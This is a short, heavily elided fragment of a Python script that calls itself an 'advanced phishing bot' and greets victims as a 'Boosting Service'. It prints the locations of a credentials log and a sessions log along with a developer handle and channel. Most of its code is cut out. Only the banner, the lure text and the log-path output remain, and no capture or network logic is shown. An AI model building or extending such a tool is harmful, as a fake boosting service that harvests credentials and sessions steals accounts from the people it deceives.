...
print(f"{RED}{BOLD}𝐀𝐊𝐀𝐒𝐇 𝐗 𝐌𝐎𝐃 𝗔𝗗𝗩𝗔𝗡𝗖𝗘𝗗 𝗣𝗛𝗜𝗦𝗛𝗜𝗡𝗚 𝗕𝗢𝗧{END}")
print(f"{MAGENTA}{BOLD}" + "="*60 + f"{END}")
...
"""
    ...
    welcome_text = """
✨ 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝐀𝐊𝐀𝐒𝐇 𝐗 𝐌𝐎𝐃 𝗕𝗼𝗼𝘀𝘁𝗶𝗻𝗴 𝗦𝗲𝗿𝘃𝗶𝗰𝗲! ✨
...
try:
    ...
    print(f"{CYAN}📁 𝗖𝗿𝗲𝗱𝗲𝗻𝘁𝗶𝗮𝗹𝘀 𝗹𝗼𝗴: {credentials_log}{END}")
    print(f"{CYAN}📁 𝗦𝗲𝘀𝘀𝗶𝗼𝗻𝘀 𝗹𝗼𝗴: {session_log}{END}")
    print(f"{YELLOW}👨‍💻 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿: @ANONYMOUS_X_MOD{END}")
    print(f"{YELLOW}📢 𝗖𝗵𝗮𝗻𝗻𝗲𝗹: @AKASH_X_MOD{END}")
    print(f"{MAGENTA}{BOLD}" + "="*60 + f"{END}")
    sys.exit(0)
